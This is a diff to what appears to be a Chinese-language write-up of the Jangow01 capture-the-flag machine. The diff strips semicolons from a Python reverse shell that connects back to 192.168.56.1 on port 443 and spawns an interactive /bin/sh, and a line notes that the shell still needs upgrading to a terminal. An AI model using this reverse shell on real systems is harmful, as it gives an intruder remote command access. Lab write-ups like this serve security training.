@@ -70,12 +70,12 @@ import subprocess
 import os
 ip="192.168.56.1"
 port=443
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect((ip,port));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((ip,port))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
 ```
 
 尝试切换用户`jangow01`,返回`su: must be run from a terminal`,需要将反弹回来的shell转换为交互式的shell
